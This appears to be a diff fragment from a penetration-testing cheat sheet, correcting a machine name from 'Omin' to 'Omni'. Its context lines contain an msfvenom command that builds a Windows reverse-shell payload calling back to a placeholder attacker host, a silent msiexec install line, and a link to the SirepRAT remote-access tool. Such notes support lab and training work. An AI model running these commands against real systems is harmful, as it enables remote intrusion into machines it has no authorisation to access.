@@ -362,7 +362,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=<attacker ip> LPORT=<attacker po
 msiexec /quiet /qn /i <payload>
 ```
 
-Used in ```Omin```
+Used in ```Omni```
 
 [SirepRAT.py](https://github.com/SafeBreach-Labs/SirepRAT)
 
